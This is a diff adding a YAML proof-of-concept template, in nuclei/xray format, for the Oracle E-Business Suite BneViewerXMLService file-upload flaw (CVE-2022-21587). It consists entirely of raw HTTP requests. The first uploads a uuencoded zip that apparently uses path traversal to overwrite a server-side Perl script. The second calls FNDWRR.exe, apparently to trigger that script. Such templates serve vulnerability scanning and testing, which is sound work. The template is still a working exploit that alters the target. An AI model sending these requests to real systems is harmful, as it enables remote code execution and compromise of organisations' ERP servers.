@@ -1,0 +1,52 @@
+id: poc-yaml-oracle-ebs-bneviewerxmlservice-fileupload
+
+info:
+  name: poc-yaml-oracle-ebs-bneviewerxmlservice-fileupload
+  author: y0y0
+  severity: critical
+  tags: xray-converted,fileupload
+  reference:
+    - https://github.com/Zh1z3ven/Oracle-E-BS-CVE-2022-21587-Exploit
+
+http:
+  - raw:
+      - |
+        POST /OA_HTML/BneViewerXMLService?bne:uueupload=TRUE HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=********************{{rand_base(8)}}
+
+        --********************{{rand_base(8)}}
+        Content-Disposition: form-data; name="uploadfilename"; filename="tempp.zip"
+        Content-Type: application/octet-stream
+        
+        begin 644 tempp.zip
+        M4$L#!!0 " @( "2#:E8               !#    +BXO+BXO+BXO+BXO+BXO
+        M1DU77TAO;64O3W)A8VQE7T5"4RUA<' Q+V-O;6UO;B]S8W)I<'1S+W1X:T9.
+        M1%=24BYP;"LM3E5P=O>TYBHHRLPK 3&MK#)2$U-2BS04=$LJ"U(5;.T4U$M2
+        M*TKT"W(2,_/4%32MN7(K%522<U,4;*'J2TH*-(!JBDO4-6$&@>2MN4KS<C+S
+        MLC7BX]T\?5SCXS6M4RLR2ZP!4$L'"(WHV(YE    =    %!+ 0(4 !0 " @(
+        M "2#:E:-Z-B.90   '0   !#                       N+B\N+B\N+B\N
+        M+B\N+B]&35=?2&]M92]/<F%C;&5?14)3+6%P<#$O8V]M;6]N+W-C<FEP=',O
+        B='AK1DY$5U)2+G!L4$L%!@     !  $ <0   -8       $!
+        
+        end
+        
+        --********************{{rand_base(8)}}--
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /OA_CGI/FNDWRR.exe HTTP/1.1
+        Host: {{Hostname}}
+        test: {{rand_base(8)}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
